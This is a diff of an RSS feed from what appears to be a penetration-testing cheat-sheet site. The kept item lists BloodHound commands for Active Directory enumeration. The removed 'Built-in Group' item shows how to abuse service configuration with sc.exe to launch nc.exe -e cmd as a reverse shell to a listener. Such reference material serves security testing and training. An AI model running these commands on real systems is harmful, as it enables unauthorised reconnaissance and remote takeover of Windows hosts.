@@ -57,13 +57,6 @@
       <description>Info Collection (From Linux) bloodhound-python # With password bloodhound-python -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip # With Kerberos sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; bloodhound-python -u &amp;lt;USER&amp;gt; -k -d &amp;lt;DOMAIN&amp;gt; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip -no-pass --use-ldaps Note: passing &amp;apos;-no-pass&amp;apos; will still ask for password, press enter&#xA;Info Collection (From Windows) SharpHound.exe SharpHound.ps1 .\SharpHound.exe -c all --outputdirectory C:\ProgramData # Import module . .</description>
     </item>
     <item>
-      <title>Built-in Group</title>
-      <link>https://tldrbins.github.io/built-in_group/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/built-in_group/</guid>
-      <description>Abuse #1. Modify service path # Start a nc listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; Windows 1. Change service path # Assumed nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; # Start service sc.exe start &amp;lt;SERVICE&amp;gt; </description>
-    </item>
-    <item>
       <title>Constrained Delegation</title>
       <link>https://tldrbins.github.io/constrained_delegation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
